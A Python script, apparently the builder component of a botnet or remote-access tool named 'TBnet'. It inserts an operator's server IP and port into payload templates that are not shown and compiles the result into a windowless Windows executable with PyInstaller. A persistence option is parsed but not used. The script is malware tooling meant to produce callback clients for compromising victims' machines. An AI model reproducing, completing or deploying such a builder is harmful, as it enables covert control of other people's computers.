import argparse
import subprocess
import os
import shutil

parser = argparse.ArgumentParser(description='TBnet Help Menu')
parser.add_argument('--host', type=str, required=True, dest='host',\
                    help='Ip du Server')
parser.add_argument('--port', type=int, required=True, dest='port',\
                    help='Port du Server')
parser.add_argument('--name', type=str, required=False, dest='name', default="client",\
                    help='Définir nom du fichier')
parser.add_argument('--persistance', type=bool, required=False, dest='persistance', default=False,\
                    help='Active la persistance automatique')

args = parser.parse_args()

class GenClient:

    pathDirFichier = "./code/"
    pathDirOutput = "./output/"

    def GenererClient(self, ip, port, persistance, name):
        if not os.path.exists(self.pathDirOutput):
            os.makedirs(self.pathDirOutput)
        fichier = open(self.pathDirOutput + name + ".pyw", "w")
        fichier.write(self.ReturnFichier("payload1.txt"))
        fichier.write("\n    host = \"" + ip + "\"\n    port = " + str(port) + "\n")
        fichier.write(self.ReturnFichier("payload2.txt"))
        fichier.close()
        os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + name + ".pyw" + " -F --clean")
        if os.path.exists(self.pathDirOutput + name + ".pyw"):
            os.remove(self.pathDirOutput + name + ".pyw")
        if os.path.exists(name + ".spec"):
            os.remove(name + ".spec")
        shutil.copyfile("dist/" + name + ".exe", self.pathDirOutput + name + ".exe")
        shutil.rmtree("dist/")
        shutil.rmtree("build/")
        shutil.rmtree("output/__pycache__")
        print("Client executable prêt : output/" + name + ".exe")
        

    def ReturnFichier(self, nom_fichier):
        fichier = open(self.pathDirFichier + nom_fichier, "r")
        text = fichier.read()
        fichier.close()
        return text
        

GenClient().GenererClient(args.host, args.port, args.persistance, args.name)

